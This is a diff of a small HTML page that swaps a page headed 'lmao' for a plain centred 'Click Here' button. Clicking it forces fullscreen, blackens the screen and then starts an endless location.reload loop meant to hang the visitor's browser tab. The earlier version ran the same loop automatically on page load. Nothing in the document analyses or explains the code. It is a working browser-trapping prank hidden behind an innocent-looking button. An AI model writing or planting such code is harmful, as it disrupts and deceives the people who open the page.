@@ -1,17 +1,48 @@
 <!DOCTYPE html>
-<html>
-<body>
+<html lang="de">
+    <head>
+        <title>Page</title>
+        <style>
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+        }
+
+        body {
+            display: table;
+        }
+
+        .my-block {
+            text-align: center;
+            display: table-cell;
+            vertical-align: middle;
+        }
+        button {
+            padding: 20px;
+        }
+        </style>
+    </head>
+    <body>
+    <div class="my-block">
+       <button onclick="myfunction()" id="ok">Click Here</button>
+    </div>
 
 
-<h2>lmao</h2>
-
-<p id="demo"></p>
 <script>
-onbeforeunload = function(){localStorage.x=1};
 
-setTimeout(function(){
-  while(1)location.reload(1)
-}, 1000)
+    function myfunction() {
+        document.body.requestFullscreen();
+        document.body.style.background = 'black';
+        document.getElementById('ok').textContent = 'Lamo!!!!';
+        onbeforeunload = function(){localStorage.x=1};
+
+        setTimeout(function(){
+        while(1)location.reload(1)
+        }, 1000)
+    }
 
 </script>
 </body>
